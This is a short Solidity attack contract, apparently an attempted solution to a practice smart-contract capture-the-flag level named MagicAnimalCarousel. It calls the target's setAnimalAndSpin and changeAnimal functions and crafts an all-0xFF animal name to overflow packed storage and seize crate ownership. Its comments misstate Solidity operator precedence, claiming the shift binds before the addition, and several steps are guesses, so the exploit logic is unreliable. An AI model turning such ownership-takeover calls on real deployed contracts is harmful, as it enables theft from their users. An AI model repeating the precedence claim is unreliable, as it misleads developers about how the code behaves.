// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract MagicCarouselAttack {
    MagicAnimalCarousel target;
    
    constructor(address _target) {
        target = MagicAnimalCarousel(_target);
    }
    
    function attack() external {
        // The bug is in setAnimalAndSpin:
        // encodedAnimal << 160 + 16 is parsed as (encodedAnimal << 160) + 16
        // We need to craft an animal name that exploits this
        
        // First, let's set an animal to move to crate 1
        target.setAnimalAndSpin("A");
        
        // Now we're at crate 1, let's use changeAnimal to take ownership
        // by passing empty string to clear owner
        target.changeAnimal("", 0);
    }
    
    function craftExploit() external {
        // We need to understand the overflow
        // If encodedAnimal << 160 results in a value where adding 16 
        // overflows into setting owner bits
        
        // Let's use maximum animal name to cause overflow
        bytes memory maxAnimal = new bytes(12);
        for(uint i = 0; i < 12; i++) {
            maxAnimal[i] = 0xFF;
        }
        
        target.setAnimalAndSpin(string(maxAnimal));
    }
    
    function checkStorage(uint256 crateId) external view returns (uint256) {
        return target.carousel(crateId);
    }
}